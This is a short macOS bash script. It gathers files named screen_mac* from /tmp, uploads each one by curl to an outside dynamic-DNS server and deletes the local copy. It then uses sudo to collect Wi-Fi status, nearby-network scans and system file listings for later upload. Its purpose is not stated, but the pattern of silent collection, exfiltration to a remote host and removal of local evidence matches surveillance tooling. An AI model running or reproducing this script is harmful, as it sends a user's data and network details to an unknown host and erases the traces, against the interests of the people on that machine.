#!/bin/bash

echo $(date) > /tmp/screen_mac_date.txt

sleep 2

find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
  echo "uploading $file"
  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
  # sleep 1
  rm $file 
done

sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport || true
sudo airport -I  2>&1 > /tmp/screen_mac_airport_I.txt || true
sudo airport -s  2>&1 > /tmp/screen_mac_airport_s.txt || true
which airport /tmp/screen_mac_which_airport.txt || true
sudo find /System/ | grep airport > /tmp/screen_mac_grep_airport.txt || true
